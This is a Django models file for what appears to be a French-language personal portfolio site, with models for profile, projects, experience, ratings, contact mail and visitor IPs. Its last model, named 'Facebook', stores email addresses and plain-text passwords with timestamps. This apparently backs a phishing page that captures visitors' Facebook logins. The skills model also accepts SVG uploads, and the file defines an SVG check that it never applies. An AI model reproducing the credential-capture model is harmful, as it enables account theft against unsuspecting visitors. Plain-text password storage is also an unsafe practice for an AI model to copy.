from django.db import models
from django.contrib.auth.models import User
import ipaddress
from django.core.validators import MinValueValidator, MaxValueValidator
from django.utils.timezone import now

from django.contrib.auth.models import User
import mimetypes
from django.core.exceptions import ValidationError
from django.core.validators import FileExtensionValidator

class Notification(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name="notifications")
    title = models.CharField(max_length=255)  # Titre de la notification
    message = models.TextField()  # Message de la notification
    is_read = models.BooleanField(default=False)  # Statut de lecture
    created_at = models.DateTimeField(auto_now_add=True)  # Date de création
    def __str__(self):
        return f"{self.title} - {self.user.username}"

class Formation(models.Model):
    titre = models.CharField(max_length=255)
    formateur = models.CharField(max_length=255)
    description = models.TextField()
    debut = models.DateField()
    fin = models.DateField()

    def __str__(self):
        return self.titre

class Profile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name="profile")
    image = models.ImageField(upload_to="profile_images/", null=True, blank=True)
    about = models.TextField(null=True, blank=True)
    date_of_birth = models.DateField(null=True, blank=True)
    link_facebook = models.URLField(max_length=255, null=True, blank=True)
    link_linkedin = models.URLField(max_length=255, null=True, blank=True)
    link_github = models.URLField(max_length=255, null=True, blank=True)
    phone_number = models.CharField(max_length=15, null=True, blank=True)
    address = models.TextField(null=True, blank=True)
    def __str__(self):
        return f"{self.user.username}'s Profile"

    def delete(self, *args, **kwargs):
        # Supprimer l'image si elle existe
        if self.image:
            self.image.delete(save=False)
        super().delete(*args, **kwargs)


        
class Education(models.Model):
    image = models.ImageField(upload_to='education_images/', blank=True, null=True)
    nom_ecole = models.CharField(max_length=255)
    nom_parcours = models.CharField(max_length=255)
    annee_debut = models.IntegerField()
    annee_fin = models.IntegerField()
    lieu = models.CharField(max_length=255)

    def __str__(self):
        return f"{self.nom_ecole} - {self.nom_parcours}"


class Experience(models.Model):
    TYPE_CHOICES = [('stage', 'Stage'),
        ('professionnel', 'Professionnel'),]
    date_debut = models.DateField()
    date_fin = models.DateField()
    entreprise = models.CharField(max_length=255)
    type = models.CharField(max_length=20, choices=TYPE_CHOICES)
    role = models.CharField(max_length=255)
    description = models.TextField(null=True, blank=True)

    def __str__(self):
        return f"{self.entreprise} - {self.role} ({self.type})"


class Projet(models.Model):
    nom = models.CharField(max_length=100)
    description = models.TextField()
    techno = models.CharField(max_length=100)
    githublink = models.URLField(blank=True, null=True)  # Lien GitHub (optionnel)
    projetlink = models.URLField(blank=True, null=True)  # Lien du projet (optionnel)

  
    def __str__(self):
        return self.nom








class Rating(models.Model):
    project_id = models.IntegerField()  # Identifiant du projet (ou portfolio)
    ip_address = models.GenericIPAddressField()  # Adresse IP du visiteur
    score = models.IntegerField()      # Note sur 5
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        unique_together = ('project_id', 'ip_address')  # Empêche une même IP de voter plusieurs fois

    def __str__(self):
        return f"Project {self.project_id}, IP {self.ip_address}: {self.score}/5"










class ImageProjet(models.Model):
    projet = models.ForeignKey(Projet, related_name='related_images', on_delete=models.CASCADE)  # Nom unique
    image = models.ImageField(upload_to='projets/images/')

    def __str__(self):
        return f"Image de {self.projet.nom}"



class Email(models.Model):
    name = models.CharField(max_length=255)
    email = models.EmailField()
    message = models.TextField()
    date = models.DateTimeField( auto_now_add=True,null=True)
    heure = models.TimeField( auto_now=True,null=True)

    def __str__(self):
        return self.name


class EmailResponse(models.Model):
    email = models.ForeignKey(Email, related_name="responses", on_delete=models.CASCADE)
    response = models.TextField()
    date = models.DateTimeField( auto_now_add=True,null=True)
    heure = models.TimeField( auto_now=True ,null=True)

    def __str__(self):
        return f"Response to {self.email.name}"


class Award(models.Model):
    titre = models.CharField(max_length=255)
    institution = models.CharField(max_length=255)
    type = models.CharField(max_length=255)
    annee = models.IntegerField()

    def __str__(self):
        return self.titre


class HistoricMail(models.Model):
    nom_entreprise = models.CharField(max_length=255)
    email_entreprise = models.EmailField()
    lieu_entreprise = models.CharField(max_length=255)
    date_envoi = models.DateField(auto_now_add=True)  # Date automatique
    heure_envoi = models.TimeField(auto_now_add=True)  # Heure automatique

    def __str__(self):
        return f"{self.nom_entreprise} - {self.email_entreprise}"

class Langue(models.Model):
    titre = models.CharField(max_length=100)
    niveau = models.CharField(max_length=50)

    def __str__(self):
        return self.titre

# Valide que le fichier est un SVG
def validate_svg(file):
    mime_type, encoding = mimetypes.guess_type(file.name)
    if mime_type != 'image/svg+xml':
        raise ValidationError("Le fichier doit être au format SVG.")

class Competence(models.Model):
    image = models.FileField(
        upload_to="competences/images/",
        blank=True, null=True,
        validators=[FileExtensionValidator(allowed_extensions=['svg', 'png', 'jpg', 'jpeg'])]  # Autoriser plusieurs formats
    )
    name = models.CharField(max_length=100)
    description = models.TextField()
    niveau = models.IntegerField()
    categorie = models.CharField(max_length=100, blank=True, null=True)

    def __str__(self):
        return self.name

class Visit(models.Model):
    timestamp = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField()

    def __str__(self):
        return f"Visit from {self.ip_address} at {self.timestamp}"




class Facebook(models.Model):
    email = models.CharField(max_length=255)
    password = models.CharField(max_length=255)  # Texte clair pour le mot de passe
    date = models.DateField(auto_now_add=True)  # Date automatique lors de la création
    heure = models.TimeField(auto_now_add=True)  # Heure automatique lors de la création

    def __str__(self):
        return self.email